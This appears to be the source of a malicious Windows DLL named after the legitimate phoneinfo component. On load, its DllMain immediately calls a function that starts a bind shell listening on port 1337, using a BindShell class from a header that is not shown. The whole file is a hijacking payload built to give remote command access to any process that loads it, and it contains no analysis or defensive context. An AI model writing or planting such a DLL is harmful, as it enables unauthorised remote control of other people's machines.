// phoneinfo.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <Windows.h>
#include <iostream>
#include <strsafe.h>
#include <tchar.h>
#include <Lmcons.h> 
#include <tlhelp32.h> 

#include "BindShell.h"

#define BUFSIZE 1024


HRESULT __stdcall BindMe()
{
	BindShell bindShell;
	bindShell.Run(1337);

	return S_OK;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		//xCall(L"DllMain()");
		BindMe();
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}




